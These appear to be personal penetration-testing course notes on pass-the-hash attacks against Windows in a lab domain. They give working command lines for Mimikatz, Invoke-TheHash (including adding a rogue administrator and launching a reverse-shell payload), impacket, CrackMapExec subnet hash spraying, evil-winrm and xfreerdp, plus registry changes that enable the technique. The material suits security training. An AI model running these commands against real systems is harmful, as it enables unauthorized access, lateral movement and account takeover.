- We can use the password hash instead of the plain text password for authentication.

#### Windows NTLM Introduction
- RC4-HMAC
- NTLM is a SSO system that uses a challenge-response protocol to verify user identities without them having to provide a password
- NTLM is still supported but Kerberos is the default auth mechanism in Win2k and later AD domains.
- NTLM passwords stored on the server and DC are not salted so we can pass them without knowing the actual password.

#### Pass the Hash - [Mimikatz](https://github.com/gentilkiwi) (Windows)
- Mimikatz has the `sekurlsa::pth` module that we can use to perform the attack.
- Parameters:
	- `/user` - User name to impersonate
	- `/rc4` or `/NTLM` - NTLM hash of the user's password
	- `/domain` - Domain the user belongs to. 
		- If its a local account then use the computer name, `localhost`, or a dot (`.`)
	- `/run` - The program we want to run with the user's context
		- If not specified, launches `cmd.exe`
- Example
	- `mimikatz.exe
	- `privilege::debug` 
	- `sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe`
	- Then we can use cmd.exe to execute commands in the user's context. In this example julio can connect to a shared folder named julio on the DC.

#### Pass the Hash - PowerShell [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash) (Windows) 
- Invoke-TheHash is a collection of PowerShell functions for performing Pass the Hash Attacks with WMI and SMB.
- Authentication is performed by passing an NTLM hash into the NTLMv2 auth protocol.
- Local admin is not required but the user we use to auth must have admin right on the target.
- Parameters:
	- Target - Hostname or IP
	- Username
	- Domain - Not needed on local accounts or when using @domain after the username
	- Hash - Either LM:NTLM or NTLM
	- Command - If not specified the function will check to see if the user has access to WMI on the target.

- **Invoke-TheHash with SMB**
	- Example using SMB that adds a user and puts it in the admin group:
``` powershell
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBEXEC -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```
- We can also use this to get a reverse shell using https://www.revshells.com/ and creating a powershell base64 payload and running that as the command

- **Invoke-TheHash with WMI**
``` powershell
Import-Module .\Invoke-TheHash.psd1
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e <base64_reverseshell_payload>"
```

#### Pass the Hash with [Impacket](https://github.com/SecureAuthCorp/impacket) (Linux)
- **Pass The Hash with PsExec**
	- `impacket-psexec user@IP -hashes 00000000000000000000000000000000:<NThash>`
- We can also use
	- `impacket-wmiexec`
	- `impacket-atexec`
	- `impacket-smbexec`

#### Pass the Hash with [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) (Linux)
- We can do "hash spraying" and try to pass a hash to see if a host will authenticate us
	- **This method can lock out domain accounts!!**
	- `crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453`
- If we want to attempt to auth to each hose using the local admins password hash we could add `--local-auth`.
	- This is helpful if we get the local admin's hash from dumping the local SAM database and want to check for pasword reuse.
	- It's common to see password reuse against many hosts in the same subnet.
	- Many orgs use "gold images" with the same local admin password or just use it across multiple hosts for ease of administration.
		- The remediation for this is for clients to implement the[ Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899). This randomizes the local admin password and be configured to rotate on a fixed interval.
- We can issues commands to Pwned! hosts via crackmapexec using the `-x` flag
	- `crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami`
- The [CME wiki](https://wiki.porchetta.industries/) has full documentation of these features.

#### Pass the Hash with [evil-winrm](https://github.com/Hackplayers/evil-winrm) (Linux)
- If SMB is blocked or we don't have admin rights, we can use this to connect to a target.
	- `evil-winrm -i <ip> -u <user> -H <hash>`
	- `evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453`
- **Note:** When using a domain account, we need to include the domain name. Ex: administrator@inlanefreight\.htb

#### Pass the Hash with RDP (Linux)
- We can use RDP PtH tools like xfreerdp to gain GUI access to a system
- Caveats:
	- **Restricted Admin Mode**: is disabled by default but needs to be enabled for this to work. Otherwise you get this error:![[Pasted image 20230328125914.png|500]]
	- This can be enabled by adding a new registry key `DisableRestrictedAdmin` (REG_DWORD) in `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` with the value of 0.
		- `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`
- Once Restricted Admin Mode is disabled we can connect using the `/pth` option
	- `xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B`


### UAC Limits Pass the Hash for Local Accounts
- When `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` is set to 0 it means that the built-in local admin account (RID-500, Administrator) is the only local account allowed to perform remote administration tasks.
	- Setting it to 1 allows other local admins
- **Note:** There is an exception. If the registry key `FilterAdministrator Token` (disabled by default) is enabled (value 1), the RID 500 account is enrolled in UAC protection. This means that remote PTH will fail against machines when using that account.